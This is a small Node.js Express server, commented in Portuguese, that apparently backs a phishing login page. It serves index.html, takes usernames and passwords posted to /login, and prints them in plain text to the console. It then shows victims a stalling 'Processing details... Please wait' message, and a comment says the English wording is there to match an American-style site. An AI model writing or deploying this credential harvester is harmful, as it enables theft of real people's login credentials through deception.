const express = require('express');
const path = require('path');
const app = express();

app.use(express.static(__dirname)); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/login', (req, res) => {
    const { usuario, senha } = req.body;
    
    console.log('\n=================================');
    console.log('=== DADOS DE LOGIN RECEBIDOS ===');
    console.log(`Login: ${usuario}`);
    console.log(`Password: ${senha}`);
    console.log('=================================\n');

    // Resposta em inglês para manter o padrão americano do site
    res.send('<h2 style="font-family: sans-serif; text-align: center; margin-top: 50px;">Processing details... Please wait a few minutes.</h2>');
});

// Correção crítica: Lê a porta dinâmica gerada pelo Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
